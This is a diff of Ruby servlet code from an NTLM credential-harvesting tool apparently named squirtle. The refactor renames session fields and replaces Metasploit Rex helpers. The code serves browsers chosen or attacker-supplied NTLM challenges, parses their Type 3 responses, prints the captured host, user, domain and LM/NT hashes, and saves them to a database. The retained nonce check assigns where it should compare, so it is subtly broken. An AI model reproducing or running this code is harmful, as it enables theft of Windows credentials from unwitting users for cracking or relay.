@@ -15,7 +15,6 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-
 # keepalive between browser and squirtle
 class KeepAliveServlet < HTTPServlet::AbstractServlet
 	
@@ -29,11 +28,11 @@ class KeepAliveServlet < HTTPServlet::AbstractServlet
 		resp['Set-Cookie'] = "key=#{key}; path=/; Max-Age=10080"
 
 		# search for a session or create a new one if it doesn't exist
-		sess = Session.find(:first, :conditions => [ "key_id = ?", key ])
+		sess = Session.find(:first, :conditions => [ "sesskey_id = ?", key ])
 		if sess == nil then
 			puts "[*] Creating new session: #{key}\n"
 			sess = Session.new
-			sess.key_id = key
+			sess.sesskey_id = key
 		end
 			
 		sess.timestamp = Time.now.to_f
@@ -80,17 +79,17 @@ class AuthorizationServlet < HTTPServlet::AbstractServlet
 		else
 			
 			# search for a session or create a new one if it doesn't exist
-			sess = Session.find(:first, :conditions => [ "key_id = ?", key ])
+			sess = Session.find(:first, :conditions => [ "sesskey_id = ?", key ])
 			if sess == nil then
 				puts "[*] Creating new session: #{key}\n"
 				sess = Session.new
-				sess.key_id = key				
+				sess.sesskey_id = key				
 			end
 				
 			sess.timestamp = Time.now.to_f
 			
 			ntlmauth = req['Authorization'].split(" ").last
-			decode = Rex::Text.decode_base64(ntlmauth.strip)
+			decode = Base64.decode64(ntlmauth.strip)
 			type = decode[8]																	
 			if type == 1 then
 				
@@ -99,16 +98,16 @@ class AuthorizationServlet < HTTPServlet::AbstractServlet
 					when "type2"
 						if sess.type2_base64.length > 0 then
 							type2msg = sess.type2_base64
-							puts "[*] Attacker supplied Type2 Base64 used: #{type2msg}"
+							puts "[*] Supplied Type2 Base64: #{URI.unescape(type2msg)}"
 						else
-							type2msg = Rex::Proto::SMB::Utils.process_type1_message(ntlmauth, sess.nonce, sess.domain, sess.server, sess.dns_name, sess.dns_domain)
-							puts "[*] Attacker supplied data Type2 returned: #{type2msg}"
+							type2msg = NTLMFUNCS.process_type1_message(ntlmauth, sess.nonce, sess.domain, sess.server, sess.dns_name, sess.dns_domain)
+							puts "[*] Supplied Type2 returned: #{URI.unescape(type2msg)}"
 						end
 					when "static"
 						if sess.nonce.length = 16 then
 							nonce = sess.nonce.to_a.pack('h*')
 						else
-							puts "[!] Attacker-supplied nonce not 16 characters: #{sess.nonce}, using preconfigured nonce"
+							puts "[!] Supplied nonce not 16 characters: #{sess.nonce}, using preconfigured nonce"
 							nonce = $config['nonce']
 						end
 					else
@@ -117,20 +116,20 @@ class AuthorizationServlet < HTTPServlet::AbstractServlet
 				end
 									
 				if sess.function != "type2" then
-					type2msg = Rex::Proto::SMB::Utils.process_type1_message(ntlmauth, nonce, $config['domain'], $config['server'], $config['dns_name'], $config['dns_domain'])
+					type2msg = NTLMFUNCS.process_type1_message(ntlmauth, nonce, $config['domain'], $config['server'], $config['dns_name'], $config['dns_domain'])
 				end
 				
-				puts "[*] Type 1 message received"
+				#puts "[*] Type 1 message received"
 				resp['WWW-Authenticate'] = "NTLM #{type2msg}"
 				resp.keep_alive = true													# keep connection alive from the client
 				resp.status = 401
 			elsif type == 3 then															# Type 3 messages are parsed here
-				puts "[*] Type 3 message received"
-				(domain, user, host, lm, nt) = Rex::Proto::SMB::Utils.process_type3_message(ntlmauth)
+				# puts "[*] Type 3 message received"
+				(domain, user, host, lm, nt) = NTLMFUNCS.process_type3_message(ntlmauth)
 				host = host.gsub(/\x00/, '')		# remove nulls (not unicode happy here)
 				user = user.gsub(/\x00/, '')		# remove nulls (not unicode happy here either)
 				domain = domain.gsub(/\x00/, '')		# ditto!
-				puts "[!] Authorization info: #{host}/#{user}:#{domain}:#{lm}:#{nt}"
+				puts "[!] #{key}: #{host}/#{user}:#{domain}:#{lm}:#{nt}"
 				
 				if sess.function == "type2" or sess.function == "static" then
 					nonce = sess.nonce
@@ -145,7 +144,7 @@ class AuthorizationServlet < HTTPServlet::AbstractServlet
 
 				# add user entry to the database
 				User.new do |u|
-					u.key = key
+					u.sesskey = key
 					u.timestamp = Time.now.to_f
 					u.ip = peeraddr
 					u.browser = req['User-Agent']
